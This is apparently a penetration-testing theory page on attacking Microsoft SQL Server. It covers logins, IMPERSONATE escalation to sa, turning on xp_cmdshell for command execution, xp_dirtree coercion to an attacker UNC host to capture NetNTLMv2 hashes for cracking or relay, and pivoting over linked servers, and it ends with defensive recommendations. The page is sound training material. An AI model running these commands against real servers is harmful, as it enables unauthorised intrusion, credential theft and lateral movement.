---
title: MSSQL
layout: post
date: 2026-09-08
description: "Attacking Microsoft SQL Server: the two authentication systems, logins versus database users, impersonation chains, xp_cmdshell and the service account it really runs as, UNC coercion, and linked servers."
permalink: /theory/misc/mssql
---

## Overview

Microsoft SQL Server is worth a page of its own because almost nothing about how it grants privilege is inherited from Windows. It runs its own account database, its own permission model, and its own impersonation mechanism, all layered on top of a Windows service account that is usually the thing an attacker actually wants.

Three facts drive nearly every SQL Server engagement, and they are worth stating before any command:

1. **There are two authentication systems**, and picking the wrong one produces a login failure that looks like a wrong password.
2. **A login is not a database user.** Server-level identity and database-level identity are separate objects, and the permissions that matter live at different levels.
3. **Code execution runs as the service account, never as `sa`.** `sa` is the SQL Server administrator and has no operating system identity at all.

## The two authentication systems

An instance runs in one of two modes, and the mode decides which credentials it will even consider.

| | SQL Server authentication | Windows authentication |
|---|---|---|
| Credential stored in | `master`, as a SQL login | The SAM or Active Directory |
| Archetype | `sa` | `DOMAIN\user`, `MACHINE\user` |
| Verified by | SQL Server itself | The operating system, via NTLM or Kerberos |
| Client flag | default | `-windows-auth` |

"Mixed Mode" enables both; "Windows Authentication mode" disables SQL logins entirely, `sa` included.

```bash
# SQL login
mssqlclient.py sa:'Password123'@10.10.10.10

# Windows login (local account on a standalone host, or a domain account)
mssqlclient.py 'user:Password123'@10.10.10.10 -windows-auth

# Domain account with Kerberos
mssqlclient.py -k -no-pass domain.local/user@sql01.domain.local
```

> `Login failed for user 'x'` on the first attempt means SQL Server looked for a **SQL login** named `x` and found none. It is not a statement about the password. If the account is a Windows account, re-run with `-windows-auth` before concluding the credential is wrong.
{: .prompt-tip }

## Logins, users, and where permissions live

Two objects, two scopes, and confusing them makes permission output unreadable:

- A **login** is server-level. It is what authenticates. `sysadmin`, `securityadmin` and `IMPERSONATE` on another login are server-level.
- A **database user** is database-level. Each database maps logins to users independently, and a login with no user in a given database falls back to the `guest` user if `guest` is enabled there.

Impacket's prompt prints both, which makes it a live status line rather than decoration:

```text
SQL (WIN-SRV\fred.green  guest@master)>
     ^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^
     login (server)      user@database
```

`guest@master` is close to the floor. `dbo@master` is the owner of `master`, which in practice means server administration.

Ask what the session actually holds:

```sql
SELECT SYSTEM_USER, USER_NAME(), IS_SRVROLEMEMBER('sysadmin');
SELECT name FROM sys.server_principals WHERE type_desc LIKE '%LOGIN%';
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
```

## Impersonation

SQL Server has a first-class "become someone else" statement, `EXECUTE AS`. It is a legitimate feature (a stored procedure often needs to run with more rights than its caller), and it is also the most common privilege escalation path inside an instance, because the permission that enables it is frequently granted by mistake.

The relevant permission is `IMPERSONATE` on another login. If a low-privileged login has been granted `IMPERSONATE` on `sa` (or on any `sysadmin`), it can switch its own session to that identity:

```sql
EXECUTE AS LOGIN = 'sa';
-- ... now operating as sa ...
REVERT;   -- switch back
```

Find these grants before guessing. This query walks every login the current session is allowed to impersonate:

```sql
SELECT pe.permission_name, pr.name AS grantee, pr2.name AS grantor
FROM sys.server_permissions pe
JOIN sys.server_principals pr  ON pe.grantee_principal_id = pr.principal_id
JOIN sys.server_principals pr2 ON pe.grantor_principal_id = pr2.principal_id
WHERE pe.permission_name = 'IMPERSONATE';
```

`mssqlclient.py` ships helpers for both halves: `enum_impersonate` runs the enumeration, and `exec_as_login <name>` issues the `EXECUTE AS`.

> `IMPERSONATE` on `sa` is not a vulnerability in SQL Server. It is a `GRANT` an administrator typed, usually to let an application login run a specific elevated procedure, and then scoped far too widely. Treat any `IMPERSONATE` grant onto a `sysadmin` login as equivalent to handing that login `sysadmin`.
{: .prompt-danger }

Impersonation can also be chained. If login A can impersonate B, and B can impersonate `sa`, two nested `EXECUTE AS` statements walk the chain. Database-level `EXECUTE AS USER = '...'` exists too and is the route through the `db_owner`-to-`sysadmin` escalation on trustworthy databases.

## xp_cmdshell and the service account

`xp_cmdshell` is an extended stored procedure that runs an arbitrary command line on the host. It is disabled by default, but disabled is a configuration flag, not a removal, and any `sysadmin`-equivalent session can turn it back on:

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

The single most important fact about the result is the identity it runs as:

> A command started by `xp_cmdshell` is created by the SQL Server service process, so it runs as the **service account**, never as `sa`. `sa` is a SQL login with no operating system identity. If the service runs as `LocalSystem`, `xp_cmdshell` is `SYSTEM`; if it runs as a domain account, that command executes on the domain as that account; if it runs as a dedicated low-privileged service user, `xp_cmdshell` inherits exactly that user's Windows rights and no more.
{: .prompt-danger }

So the value of reaching `sa` depends entirely on what the service account is, which is worth establishing early. The next section does it without any privilege at all. A service account reached this way is very often a member of a service group that holds `SeImpersonatePrivilege`, which is the entry point for the potato family of local escalations to `SYSTEM`; see [logon types and privileges](/theory/windows/logon-and-privileges).

> Enabling `xp_cmdshell` is a persistent, well-monitored configuration change, not a session setting. It stays on after you disconnect and is a standard detection signature. Record the original value and set it back to `0` when finished.
{: .prompt-warning }

## UNC coercion: reading the service account without cracking anything

Several built-in procedures take a path argument and make the service walk it. Point one at an attacker-controlled UNC path and the SQL service authenticates to it as itself, leaking a NetNTLMv2 challenge-response for the service account:

```sql
EXEC xp_dirtree '\\10.10.14.10\share\x';
-- also: xp_fileexist, and the OLE-automation and backup procedures
```

Catch it with `smbserver.py` from [Impacket](https://github.com/fortra/impacket) or with [Responder](https://github.com/lgandx/Responder):

```bash
sudo smbserver.py -smb2support share /tmp/share
```

`xp_dirtree` is executable by low-privileged logins by default, which makes it the cheapest way to answer "what account does this instance run as" without holding `sysadmin`. The captured NetNTLMv2 is a bonus: it cannot be pass-the-hashed (it is a challenge-response, not the NT hash), so it is only useful cracked offline or relayed with `ntlmrelayx.py` to another host where the service account has rights.

## Linked servers

A linked server is a stored connection from one instance to another, and it carries its own credentials. `sysadmin` on one instance frequently means code execution on every instance it links to, because `EXECUTE AS` and `xp_cmdshell` both work through the link and the link often authenticates as a high-privileged login on the far side:

```sql
EXEC sp_linkedservers;
SELECT * FROM sys.servers WHERE is_linked = 1;
-- run a query on the far side:
EXEC ('SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'');') AT [LINKED\INSTANCE];
```

Links can chain across several hops, and the effective privilege at the end is often higher than at the start. `mssqlclient.py`'s `enum_links` maps them.

## Defensive notes

- Use Windows Authentication mode rather than Mixed Mode where possible, so there is no `sa` password to spray or reuse.
- Never grant `IMPERSONATE` on a `sysadmin` login. Where a procedure needs elevation, sign it with a certificate instead.
- Run the service as a dedicated low-privileged account, never `LocalSystem` or a domain admin, so that `xp_cmdshell` and coercion leak as little as possible.
- Leave `xp_cmdshell` disabled and alert on `sp_configure` changes to it.
- Firewall 1433 to the hosts that need it. A locally-bound instance reached only by tunnelling is still reached; segmentation is not a substitute for the controls above.

## Examples on this site

Boxes on this site whose path goes through SQL Server, listed automatically from their tags:

{% assign mssql_tags = "mssql" | split: "," -%}
{% for post in site.posts -%}
{%- assign match = false -%}
{%- for t in post.tags -%}
{%- if mssql_tags contains t -%}{%- assign match = true -%}{%- endif -%}
{%- endfor -%}
{%- if match %}
- [{{ post.title }}]({{ post.url }}){% endif -%}
{%- endfor %}

## References

- [Microsoft - EXECUTE AS (Transact-SQL)](https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql)
- [Microsoft - xp_cmdshell (Transact-SQL)](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql)
- [Impacket](https://github.com/fortra/impacket)
- [NetExec - MSSQL protocol](https://www.netexec.wiki/mssql-protocol)
- [HackTricks - Pentesting MSSQL](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html)
